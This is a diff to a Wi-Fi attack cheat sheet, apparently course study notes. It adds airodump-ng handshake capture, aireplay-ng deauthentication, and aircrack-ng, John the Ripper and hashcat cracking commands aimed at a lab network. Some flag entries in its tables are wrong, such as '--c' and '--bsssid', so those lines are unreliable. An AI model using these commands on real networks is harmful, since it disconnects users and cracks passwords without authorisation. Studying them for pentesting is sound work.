@@ -20,7 +20,7 @@ ifconfig
 ### WEP, WPA/WPA2
 #### Don't forget to specify interface
 ```
-sudo airodump-ng [interface] -c [channel]
+sudo airodump-ng [interface] --channel [#] --bssid [BSSID] --essid [ESSID] -w [file.cap]
 sudo airodump-ng wlan0mon -c 2
 sudo airodump-ng wlan0mon -c 3 --bssid 34:08:04:09:3D:38 -w 1.cap
 ```
@@ -29,7 +29,7 @@ sudo airodump-ng wlan0mon -c 3 --bssid 34:08:04:09:3D:38 -w 1.cap
 |-w|output filename| 
 |--bsssid|specific BSSID|
 |--essid|specific client ESSID|
-|-c|channel|
+|--c|channel|
 |-g|GPS|
 |--ivs| Interval Vectors
 |-R|Regular Expression|
@@ -41,7 +41,8 @@ sudo airmon-ng start wlan0 #
 ```
 ### Deauth
 ```
-sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 wlan0mon
+sudo aireplay-ng [attack type] [# of deauths] -a [BSSID] -c [clientBSSID] [interface]
+sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 -c 35:08:04:09:3D:40 wlan0mon
 ```
 |CMD|DESC|
 |-----|-----|
@@ -52,15 +53,23 @@ sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 wlan0mon
 
 ## Aircrack-ng
 ```
+aircrack-ng -w [path to wordlist] -e [ESSID] -b [BSSID] [file.cap]
 aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
 ```
 ### John the Ripper
 ```
+sudo nano /etc/john/john.conf
+john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123
+john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap
+
 john --format=netntlm timothy --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 ### Hashcat
 ```
+/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
 hashcat -m [hashtype] [hash] [dictionary]
+hashcat -m 2500 output.hccapx /usr/share/john/password.lst
+
 ```
 ## Useful Linux Commands
 ```
